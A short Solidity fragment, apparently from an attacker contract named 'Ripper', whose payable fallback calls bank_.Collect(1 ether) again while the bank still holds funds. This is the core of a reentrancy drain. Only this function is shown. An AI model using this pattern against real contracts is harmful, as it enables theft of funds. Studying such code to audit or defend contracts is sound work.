(contract Ripper)

function() payable public {
        if (address(bank_).balance >= msg.value) {
            bank_.Collect(1 ether);
        }
    }
